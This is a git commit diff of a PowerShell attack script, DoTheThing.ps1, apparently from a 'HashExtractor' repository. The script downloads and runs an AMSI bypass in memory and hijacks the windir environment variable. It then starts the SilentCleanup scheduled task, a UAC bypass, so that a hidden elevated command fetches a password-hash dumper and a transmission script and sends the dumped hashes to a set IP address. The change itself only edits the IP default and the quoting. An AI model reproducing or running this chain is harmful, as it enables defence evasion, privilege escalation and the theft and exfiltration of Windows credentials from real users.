42425fc3cfab84168636fabcd73e9178c203f9e6
mo-tec <moritzpfefferkorn@hotmail.com>
2020-10-12 17:23:36 +0200

    Update DoTheThing.ps1

--- DoTheThing.ps1
+++ DoTheThing.ps1
@@ -1,8 +1,8 @@
-﻿$ip = ''
+﻿$ip = 'localhost'
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1')
 $registryPath = "HKCU:\Environment"
 $Name = "windir"
-$Value = "powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Get-PassHashes.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1');Get-PassHashes | Out-String | Invoke-Transmission -ip " + $ip + ";#"
+$Value = "powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Get-PassHashes.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1');Get-PassHashes | Out-String | Invoke-Transmission -ip " + $ip + ";#"
 Set-ItemProperty -Path $registryPath -Name $name -Value $Value
 schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
 sleep 2
